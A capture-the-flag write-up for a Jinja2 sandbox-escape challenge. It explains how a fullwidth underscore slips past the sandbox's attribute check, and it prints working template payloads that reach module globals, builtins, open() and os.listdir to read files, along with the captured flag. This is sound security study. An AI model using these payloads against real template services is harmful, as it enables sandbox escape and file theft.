# LetMeOut

Pwn, 60 points, 269 solves. The service renders whatever you type as a Jinja2 template inside a
`SandboxedEnvironment`, with `globals` and `filters` cleared and two invented filters installed.
One of the two wrappers normalises its argument with NFKC. Jinja 3.1.6 looks the attribute up
under the normalised name and runs its safety check on the original, and that mismatch is the
escape.

## What you are given

`letmeout.zip` expands to the complete service:

```
jail.py             the render loop
entrypoint.py       flag placement and privilege drop
Dockerfile          python:3.13-slim-bookworm, socat, shells removed
docker-compose.yml  FLAG in the environment
requirements.txt    Jinja2 == 3.1.6
flag.txt            hiCTF{fake_flag_for_local_testing}
```

The portal supplies `<challenge-host>` and `<port>`; the connection is TLS. Either
`ncat --ssl <challenge-host> <port>` or a pwntools `remote(host, port, ssl=True)` reaches it. No
login material.

`jail.py` takes up to 32 lines. A line is rendered only when all three hold: `layout.isascii()`,
`len(layout) <= 170`, and the number of distinct alphabetic characters in the line is at most 3.
Two names are sampled from `buff, cuff, duff, guff, huff, luff, muff, puff, ruff, tuff` and mapped,
in that order, to `rich` and `plain`. `rich(v)` returns `Tag(v)`, a `str` subclass whose `__str__`
returns `unicodedata.normalize("NFKC", self)`. `plain(v)` returns `str(Tag(v))`, so it normalises
at filter time.

`entrypoint.py` writes the flag to `/flags/<8 hex>`, adds three decoy files that read `not the flag
you're looking for`, deletes `/flag.txt`, changes to `/flags`, drops to `nobody:nogroup` and serves
`python /app/jail.py` under socat with `max-children=24`. `/bin/sh`, `/bin/dash` and `/bin/bash`
are removed from the image, so a shell escape is not available even after a full read primitive.

## Reproduction

1. Confirm the render. `{{ 1+1 }}` prints `2`; the prompt is `> `.

2. Find which two filters exist. An undefined filter raises, the exception is swallowed and the
   line renders empty, so this probe prints `0` only for a name that is installed:

   ```
   {{0|buff}}
   ```

   Repeat for all ten names. Each connection draws its own pair, so record the pair before doing
   anything else, and reconnect if both filters you need are not the ones drawn.

3. Decide which of the pair is `rich`. Subscript a string with a fullwidth underscore:

   ```
   {{''['\uff3f__class__'|F]}}
   ```

   `F` is the filter name. `rich` normalises the Tag inside `getattr` and returns `<class 'str'>`.
   `plain` hands `is_safe_attribute` the already normalised ASCII name and raises `SecurityError`,
   which renders as an empty line.

4. Read the bug in `SandboxedEnvironment.getitem`:

   ```python
   if isinstance(argument, str):
       attr = str(argument)          # NFKC-normalises a Tag
       value = getattr(obj, attr)
       if self.is_safe_attribute(obj, argument, value):
           return value
   ```

   The lookup uses `str(argument)`; the check uses `argument`. A string that starts with U+FF3F
   FULLWIDTH LOW LINE fails `startswith("_")` and normalises to an ASCII underscore, so one dunder
   name per subscript is reachable.

5. Fit the payload into three letters. Only the filter name's first letter, `u` and `f` may appear
   literally; every other letter goes in as a three digit octal escape inside a string literal,
   and the fullwidth underscore is written `\uff3f`. Jinja's string parser decodes both, so the
   line stays ASCII on the wire while the rendered argument really contains the fullwidth
   character. The 170 character cap is the binding constraint: with an 8 digit file name, the read
   payload runs 159 to 168 characters depending on which filter name was drawn.

6. Reach the module globals. `''['format']` is a failed string subscript, so getitem falls back to
   `getattr` and returns `str.format`. That method is defined in `jinja2.sandbox`, so its
   `__globals__` is the sandbox module namespace, which holds `__builtins__`:

   ```
   {{''['\146\157\162\155\141\164']['\uff3f__globals__'|F]['__builtins__']['open']('11678341')['read']()}}
   ```

   `__builtins__` and `open` are dictionary keys, so plain subscripts reach them without the
   sandbox check; only `__globals__` is an attribute lookup and needs the trick. The line above
   shows the names in clear for readability. In the line that is actually sent, every letter
   outside the three permitted ones is rewritten as an octal escape, and the local generator does
   that rewrite for you.

7. List the directory before reading. The file names are random per container, and the same
   primitive reaches `os` through public names only:

   ```
   {{''['\146\157\162\155\141\164']['\uff3f__globals__'|F]['t']['sys']['modules']['os']['listdir']()}}
   ```

   `t` is the `typing` module, which exposes `sys`; `sys.modules` is a dict, so `os` and `listdir`
   are ordinary subscripts. The recorded listing was `11678341`, `c31fe5dd`, `e6666171`,
   `8510193e`.

8. Read the candidates with the payload from step 6, substituting the eight digit name. `11678341`
   returned the flag. `e6666171` and `8510193e` returned the decoy line. `c31fe5dd` was not read:
   its name contains letters that have to be escaped, and with the filter pair that connection had
   the payload came out one character over the 170 cap. It was a decoy by elimination, since the
   entrypoint writes one real file and three decoys.

9. The driver output is recorded as `11678341 -> hiCTF{...}`, and the submission log records
   `goodFlag` on 31 October 2026.

10. What the notes do not record: the filter pair the accepted connection drew, the rendered text
    of the directory listing, and the contents of `c31fe5dd`.

## Why it works

The sandbox trusts two different values for one lookup. Normalisation is meant to widen the set of
characters that spell the same name; here it widens only what `getattr` sees, while the guard still
compares the raw argument against `_`. A single character that folds to an underscore is enough to
walk from a public string method to the module globals, and from there to `__builtins__`.

The second mistake is in the filter design. A `str` subclass whose `__str__` changes the value is
handed to code that assumes `str(x)` and `x` name the same attribute. Either half alone would be
harmless: the NFKC mismatch does nothing without a value that can carry a fullwidth character, and
the `Tag` class does nothing without a check that reads the original argument.

## Flag

```
hiCTF{__^_^__n0rm4l1z3_b3f0r3_y0u_tru5t__>_<___4e323a9e48}
```
